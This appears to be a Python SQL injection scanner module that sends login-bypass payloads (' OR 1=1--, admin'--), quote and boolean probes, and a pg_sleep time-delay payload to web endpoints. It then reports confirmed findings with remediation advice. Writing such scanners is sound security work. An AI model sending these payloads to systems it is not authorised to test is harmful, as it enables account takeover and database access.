"""
Safe, comprehensive, indicator-based SQL Injection detection module.

Techniques implemented:
1. Authentication Bypass SQLi:
   - Targets authentication & login endpoints (POST JSON bodies, form bodies, query parameters).
   - Tests standard SQL injection authentication bypass vectors:
     ' OR 1=1--, ' OR '1'='1, ' OR 1=1#, admin'--, admin' or '1'='1, ') OR 1=1--
   - Analyzes response transition: baseline 401/403/error -> bypass 200/201/302.
   - Inspects response tokens (JWT, accessToken, session, authentication object, cookies).
   - Verifies against negative control probes (' OR 1=2--) to prevent false positives.
   - Assigned Severity: Critical, Confidence: Confirmed, Detection Status: Confirmed.

2. Error-based SQLi:
   - Comprehensive regex patterns covering SQLite, Sequelize, MySQL, MariaDB, PostgreSQL, MSSQL, Oracle, DB2.
   - Tests quote variations: ', '', ", '), '--
   - Verifies database error signatures against baseline and paired-quote resolution.

3. Boolean-based SQLi:
   - Compares True vs False conditions against baseline response.
   - Numeric and string syntax: AND 71=71 vs AND 71=72, ' AND '1'='1 vs ' AND '1'='2, ' OR 1=1-- vs ' OR 1=2--.
   - Evaluates status code divergence and response length differences.

4. Conservative Time-based SQLi:
   - Uses conservative 1.5s delay probe with baseline comparison and negative control verification.

Safety guarantees:
- Harmless non-destructive indicators only.
- Strict timeout bounds.
- Reproducible evidence required for confirmed findings.
"""
import json
import logging
import re
import time
from typing import List, Dict, Any, Optional, Tuple
from urllib.parse import urlparse, urlencode, parse_qsl, urlunparse

from app.scanner.http_client import SafeHTTPClient
from app.scanner.models import DiscoveredEndpoint, DiscoveredParameter, ScanFinding

logger = logging.getLogger("scanner.sql_injection")

SQL_ERROR_PATTERNS = [
    # SQLite & SQLite ORMs (Sequelize, SQLite3, etc.)
    r"sqlite3?\.operationalerror",
    r"sqlite_exception",
    r"sqlite_error",
    r"sqlitedatabaseerror",
    r"sequelizedatabaseerror",
    r"near [^:]+: syntax error",
    r"near \"[^\"]*\": syntax error",
    r"near \'[^\']*\': syntax error",
    r"unrecognized token:",
    r"sqlite3?\.databaseerror",
    # MySQL / MariaDB
    r"you have an error in your sql syntax",
    r"warning: mysql_",
    r"valid mysql result",
    r"check the manual that corresponds to your (mysql|mariadb) server version",
    r"mysql_fetch_array\(\)",
    r"mySqlClient\.",
    r"com\.mysql\.jdbc\.exceptions",
    # PostgreSQL
    r"psycopg2\.errors",
    r"psycopg\.errors",
    r"pg_query\(\)",
    r"syntax error at or near",
    r"unterminated quoted string at or near",
    r"query failed: error: syntax error",
    r"org\.postgresql\.util\.psqlexception",
    r"valid postgresql result",
    # Microsoft SQL Server / Sybase
    r"unclosed quotation mark after the character string",
    r"microsoft ole db provider for sql server",
    r"syntax error converting the varchar value",
    r"driver.*sql[\-\_\ ]*server",
    r"ole db.*sql server",
    r"microsoft sql native client",
    r"System\.Data\.SqlClient\.SqlException",
    # Oracle
    r"ora-01756",
    r"ora-00933",
    r"ora-00936",
    r"ora-\d{5}",
    # Generic SQL / ODBC / JDBC / ORMs
    r"sqlstate\[",
    r"cli driver.*db2",
    r"jdbc.*sql",
    r"error in your sql query",
    r"database error.*syntax",
    r"sqlalchemy\.exc",
    r"django\.db\.utils",
    r"typeorm",
]

SQL_ERROR_RE = re.compile("|".join(SQL_ERROR_PATTERNS), re.IGNORECASE)

# Ignored parameters that are typically not injectable or shouldn't be altered
IGNORED_PARAMS = {"csrf", "token", "_csrf", "authenticity_token", "_token", "nonce", "__requestverificationtoken"}

JWT_REGEX = re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}")


def _set_url_param(url: str, name: str, value: str) -> str:
    p = urlparse(url)
    q = dict(parse_qsl(p.query))
    q[name] = value
    return urlunparse(p._replace(query=urlencode(q)))


def _set_body_param(sample_params: Dict[str, str], name: str, value: str) -> Dict[str, str]:
    copied = dict(sample_params)
    copied[name] = value
    return copied


async def _send_request(
    client: SafeHTTPClient,
    method: str,
    url: str,
    param_name: str,
    param_val: str,
    location: str,
    base_body_params: Dict[str, str],
    content_type: Optional[str] = None,
) -> Optional[Any]:
    try:
        t0 = time.monotonic()
        is_json = (
            location == "json"
            or "json" in (content_type or "").lower()
            or (method.upper() == "POST" and any(k in url.lower() for k in ("/rest/", "/api/")))
        )
        if is_json and method.upper() == "POST":
            payload = _set_body_param(base_body_params, param_name, param_val)
            resp = await client.post(url, json=payload)
        elif method.upper() == "POST" or location in ("body", "form"):
            payload = _set_body_param(base_body_params, param_name, param_val)
            resp = await client.post(url, data=payload)
        else:
            target_url = _set_url_param(url, param_name, param_val)
            resp = await client.get(target_url)
        elapsed = time.monotonic() - t0
        if resp is not None:
            setattr(resp, "_elapsed_seconds", elapsed)
        return resp
    except Exception as exc:
        logger.debug("SQLi _send_request error for %s on %s: %s", method, url, exc)
        return None


def _check_auth_indicators(resp: Any, baseline_text: str) -> Tuple[bool, Optional[str]]:
    """
    Check if an HTTP response contains indicators of successful authentication
    such as JWT tokens, session cookies, user objects, or authentication JSON keys.
    """
    if resp is None:
        return False, None

    resp_text = resp.text or ""
    headers = getattr(resp, "headers", {})

    # Check for JWT token pattern
    jwt_match = JWT_REGEX.search(resp_text)
    if jwt_match:
        token_preview = jwt_match.group(0)[:28] + "..."
        return True, f"JWT Authentication Token detected in response ({token_preview})"

    # Check Set-Cookie headers for session identifiers
    set_cookie = headers.get("set-cookie", "")
    if any(k in set_cookie.lower() for k in ("token=", "jwt=", "session=", "connect.sid=", "auth=")):
        cookie_snippet = set_cookie.split(";")[0] if ";" in set_cookie else set_cookie[:30]
        return True, f"Session authentication cookie issued ({cookie_snippet})"

    # Check JSON response structure
    try:
        data = json.loads(resp_text)
        if isinstance(data, dict):
            # OWASP Juice Shop: {"authentication": {"token": "...", "bid": 1, "umail": "admin@juice-sh.op"}}
            if "authentication" in data and isinstance(data["authentication"], dict):
                auth_data = data["authentication"]
                umail = auth_data.get("umail") or auth_data.get("email") or "authenticated user"
                return True, f"Authentication object returned for account '{umail}'"

            if "token" in data or "accessToken" in data or "jwt" in data:
                return True, "Authentication token key returned in JSON response"

            if data.get("success") is True and ("user" in data or "profile" in data):
                return True, "Successful login profile returned in JSON response"
    except Exception:
        pass

    return False, None


async def scan(endpoint: DiscoveredEndpoint, client: SafeHTTPClient) -> List[ScanFinding]:
    findings: List[ScanFinding] = []
    method = endpoint.method.upper()
    url_lower = endpoint.url.lower()

    # Determine tested parameters
    tested_params = [
        p for p in endpoint.parameters
        if p.name and p.name.lower() not in IGNORED_PARAMS
    ]

    # If this is an authentication/login POST endpoint without explicit parameters, populate defaults
    is_auth_endpoint = any(k in url_lower for k in ("login", "signin", "auth", "session", "user", "token"))
    if not tested_params and method == "POST" and is_auth_endpoint:
        tested_params = [
            DiscoveredParameter(name="email", location="json", sample_value="test@example.com"),
            DiscoveredParameter(name="password", location="json", sample_value="password123"),
        ]

    if not tested_params:
        return findings

    # Build dictionary of default body parameters with sensible values
    body_defaults: Dict[str, str] = {}
    for p in endpoint.parameters:
        val = p.sample_value
        if not val:
            p_low = p.name.lower()
            if "mail" in p_low:
                val = "test@example.com"
            elif "pass" in p_low:
                val = "test_password_123"
            elif "user" in p_low or "login" in p_low:
                val = "test_user"
            else:
                val = "test"
        body_defaults[p.name] = val

    # Ensure login endpoints have both email/user and password in default body
    if is_auth_endpoint and method == "POST":
        if "email" not in body_defaults and "username" not in body_defaults and "user" not in body_defaults:
            body_defaults["email"] = "test@example.com"
        if "password" not in body_defaults and "pass" not in body_defaults:
            body_defaults["password"] = "test_password_123"

    for param in tested_params:
        location = param.location or ("json" if ("json" in (endpoint.content_type or "").lower() or "/rest/" in url_lower) else ("body" if method == "POST" else "query"))
        base_val = param.sample_value or ("test@example.com" if "mail" in param.name.lower() else "1")

        # 1. Baseline Request
        baseline = await _send_request(
            client, method, endpoint.url, param.name, base_val, location, body_defaults, endpoint.content_type
        )
        if baseline is None:
            continue

        baseline_text = baseline.text or ""
        baseline_time = getattr(baseline, "_elapsed_seconds", 0.2)
        baseline_has_error = bool(SQL_ERROR_RE.search(baseline_text))

        indicators: List[str] = []
        evidence_records: List[Dict[str, Any]] = []
        is_auth_bypass_confirmed = False

        # 2. Authentication Bypass SQLi Checks (Priority 1)
        # Check if parameter is associated with authentication or login
        is_auth_param = any(k in param.name.lower() for k in ("email", "username", "user", "login", "account", "identifier", "uid", "name"))
        if (is_auth_endpoint or is_auth_param or baseline.status_code in (401, 403, 400, 422)):
            auth_bypass_probes = [
                "' OR 1=1--",
                "' OR '1'='1",
                "' OR 1=1#",
                "' OR 1=1/*",
                "admin'--",
                "admin' or '1'='1",
                "') OR 1=1--",
                "' or 1=1 limit 1--",
            ]

            for bypass_payload in auth_bypass_probes:
                resp = await _send_request(
                    client, method, endpoint.url, param.name, bypass_payload, location, body_defaults, endpoint.content_type
                )
                if resp is None:
                    continue

                has_auth_indicators, auth_detail = _check_auth_indicators(resp, baseline_text)
                status_elevated = (baseline.status_code in (401, 403, 400, 422) and resp.status_code in (200, 201, 302))

                if status_elevated or has_auth_indicators:
                    # Execute reproducible Negative Control Probe to eliminate false positives
                    control_payload = "' OR 1=2--"
                    control_resp = await _send_request(
                        client, method, endpoint.url, param.name, control_payload, location, body_defaults, endpoint.content_type
                    )
                    control_status = control_resp.status_code if control_resp else 401
                    control_has_auth, _ = _check_auth_indicators(control_resp, baseline_text)

                    # Confirmed if bypass succeeded (200/auth) while negative control failed (matches baseline/unauthorized)
                    if not control_has_auth and (control_status != resp.status_code or control_status in (401, 403, 400, 422)):
                        is_auth_bypass_confirmed = True
                        msg = (
                            f"SQL Injection Authentication Bypass verified: Payload '{bypass_payload}' returned HTTP {resp.status_code} "
                            f"with authentication success ({auth_detail or 'login access granted'}), while negative control '{control_payload}' "
                            f"was rejected with HTTP {control_status}."
                        )
                        indicators.append(msg)
                        evidence_records.append({
                            "technique": "Authentication Bypass SQLi",
                            "payload": bypass_payload,
                            "baseline_status": baseline.status_code,
                            "bypass_status": resp.status_code,
                            "negative_control_payload": control_payload,
                            "negative_control_status": control_status,
                            "auth_indicator": auth_detail or "Authentication token/profile returned",
                        })
                        logger.warning(
                            "CRITICAL SQL Injection Auth Bypass confirmed url=%s param=%s payload=%s",
                            endpoint.url, param.name, bypass_payload
                        )
                        break

        # 3. Error-Based SQLi Checks
        error_probes = ["'", "''", "\"", "')", "'--", "1'"]
        for probe in error_probes:
            test_val = f"{base_val}{probe}"
            resp = await _send_request(
                client, method, endpoint.url, param.name, test_val, location, body_defaults, endpoint.content_type
            )
            if resp is not None and resp.text:
                match = SQL_ERROR_RE.search(resp.text)
                if match and not baseline_has_error:
                    error_snippet = match.group(0)
                    msg = f"Database error pattern detected ('{error_snippet}') with test payload '{test_val}'."
                    indicators.append(msg)
                    evidence_records.append({
                        "technique": "Error-Based",
                        "payload": test_val,
                        "status_code": resp.status_code,
                        "error_matched": error_snippet,
                    })
                    break
                elif resp.status_code >= 500 > baseline.status_code:
                    # Verify with paired quote ''
                    paired_val = f"{base_val}''"
                    paired_resp = await _send_request(
                        client, method, endpoint.url, param.name, paired_val, location, body_defaults, endpoint.content_type
                    )
                    paired_status = paired_resp.status_code if paired_resp else 500
                    if paired_status < 500:
                        msg = f"SQL syntax error (HTTP 500) triggered by single quote '{test_val}', resolved by paired quote '{paired_val}' (HTTP {paired_status})."
                        indicators.append(msg)
                        evidence_records.append({
                            "technique": "Error-Based (Syntax Disruption / Resolution)",
                            "disruptive_payload": test_val,
                            "resolving_payload": paired_val,
                            "disruptive_status": resp.status_code,
                            "resolving_status": paired_status,
                        })
                        break

        # 4. Boolean-Based SQLi Checks (if not already verified by auth bypass)
        if not is_auth_bypass_confirmed and len(indicators) < 2:
            boolean_pairs = [
                (f"{base_val} AND 71=71", f"{base_val} AND 71=72"),
                (f"{base_val}' AND '71'='71", f"{base_val}' AND '71'='72"),
                (f"{base_val}' OR '71'='71", f"{base_val}' OR '71'='72"),
                (f"{base_val}' OR 1=1--", f"{base_val}' OR 1=2--"),
            ]

            for true_payload, false_payload in boolean_pairs:
                true_resp = await _send_request(
                    client, method, endpoint.url, param.name, true_payload, location, body_defaults, endpoint.content_type
                )
                false_resp = await _send_request(
                    client, method, endpoint.url, param.name, false_payload, location, body_defaults, endpoint.content_type
                )

                if true_resp is not None and false_resp is not None:
                    true_len = len(true_resp.text or "")
                    false_len = len(false_resp.text or "")
                    base_len = len(baseline_text)

                    true_status = true_resp.status_code
                    false_status = false_resp.status_code
                    base_status = baseline.status_code

                    # Status code divergence: True condition matches baseline, False condition differs
                    if true_status == base_status and false_status != base_status:
                        indicators.append(
                            f"Boolean response status differed: True payload '{true_payload}' returned {true_status}, "
                            f"False payload '{false_payload}' returned {false_status}."
                        )
                        evidence_records.append({
                            "technique": "Boolean-Based Status Divergence",
                            "true_payload": true_payload,
                            "false_payload": false_payload,
                            "true_status": true_status,
                            "false_status": false_status,
                        })
                        break

                    # Content length divergence: True condition is close to baseline, False condition differs significantly
                    diff_true = abs(true_len - base_len)
                    diff_false = abs(false_len - base_len)
                    if diff_true < 35 and diff_false > 80:
                        indicators.append(
                            f"Boolean length difference: True payload '{true_payload}' matched baseline length (delta={diff_true}), "
                            f"while False payload '{false_payload}' altered response length (delta={diff_false})."
                        )
                        evidence_records.append({
                            "technique": "Boolean-Based Length Divergence",
                            "true_payload": true_payload,
                            "false_payload": false_payload,
                            "length_delta_false": diff_false,
                        })
                        break

        # 5. Conservative Time-Based SQLi Checks
        if baseline_time < 1.5 and len(indicators) < 1 and not is_auth_bypass_confirmed:
            time_payload = f"{base_val}' OR pg_sleep(1.5)--"
            timed_resp = await _send_request(
                client, method, endpoint.url, param.name, time_payload, location, body_defaults, endpoint.content_type
            )
            if timed_resp is not None:
                timed_elapsed = getattr(timed_resp, "_elapsed_seconds", 0.0)
                if timed_elapsed >= baseline_time + 1.3:
                    control_payload = f"{base_val}' OR pg_sleep(0)--"
                    control_resp = await _send_request(
                        client, method, endpoint.url, param.name, control_payload, location, body_defaults, endpoint.content_type
                    )
                    control_elapsed = getattr(control_resp, "_elapsed_seconds", 0.0) if control_resp else 0.0

                    if control_elapsed < baseline_time + 0.8:
                        indicators.append(
                            f"Conservative time delay verified: sleep payload ({timed_elapsed:.2f}s) "
                            f"exceeded baseline ({baseline_time:.2f}s), confirmed by control probe ({control_elapsed:.2f}s)."
                        )
                        evidence_records.append({
                            "technique": "Time-Based Delay",
                            "payload": time_payload,
                            "measured_duration": round(timed_elapsed, 2),
                            "baseline_duration": round(baseline_time, 2),
                        })

        if not indicators:
            continue

        # Confidence and severity determination based on verified evidence
        has_auth_bypass = is_auth_bypass_confirmed
        has_error = any("error" in ind.lower() for ind in indicators)
        has_boolean = any("boolean" in ind.lower() for ind in indicators)
        has_time = any("time" in ind.lower() for ind in indicators)

        if has_auth_bypass:
            severity = "Critical"
            confidence = "Confirmed"
            detection_status = "Confirmed"
            description = (
                f"The parameter '{param.name}' on {method} {endpoint.url} allows SQL injection authentication bypass. "
                "An attacker can bypass the login mechanism and authenticate as an administrator without valid credentials."
            )
            impact = (
                "Complete authentication bypass. An unauthenticated attacker can log into user and administrative accounts, "
                "access confidential data, and perform unauthorized administrative actions."
            )
        elif (has_error and has_boolean) or (has_error and has_time) or (has_boolean and has_time):
            severity = "Critical"
            confidence = "Confirmed"
            detection_status = "Confirmed"
            description = (
                f"The parameter '{param.name}' on {method} {endpoint.url} allows user input "
                "to manipulate backend SQL execution syntax, verified by multiple independent detection techniques."
            )
            impact = "An attacker could execute arbitrary SQL queries, bypass authentication, and access or modify sensitive database records."
        elif has_error or (has_boolean and len(evidence_records) >= 1):
            severity = "High"
            confidence = "Confirmed"
            detection_status = "Confirmed"
            description = (
                f"The parameter '{param.name}' on {method} {endpoint.url} allows user input "
                "to manipulate backend SQL execution syntax."
            )
            impact = "An attacker could execute arbitrary SQL queries and access or modify sensitive database records."
        else:
            severity = "High"
            confidence = "Medium confidence"
            detection_status = "Requires Manual Verification"
            description = (
                f"The parameter '{param.name}' on {method} {endpoint.url} exhibited suspicious behavior consistent with SQL injection."
            )
            impact = "Potential database query manipulation requiring manual confirmation."

        findings.append(ScanFinding(
            type="SQL Injection",
            category="Injection",
            owasp_category="A03:2021 - Injection",
            url=endpoint.url,
            method=method,
            parameter=param.name,
            severity=severity,
            confidence=confidence,
            cwe_id="CWE-89",
            mitre_attack="T1190",
            detection_status=detection_status,
            finding_group="critical_vulnerabilities",
            evidence=" | ".join(indicators),
            description=description,
            impact=impact,
            remediation="Use parameterized queries / prepared statements (e.g. PDO, SQLAlchemy, parameterized SQL), input validation, and least privilege database roles.",
            evidence_details={"records": evidence_records, "indicators": indicators},
        ))

    return findings
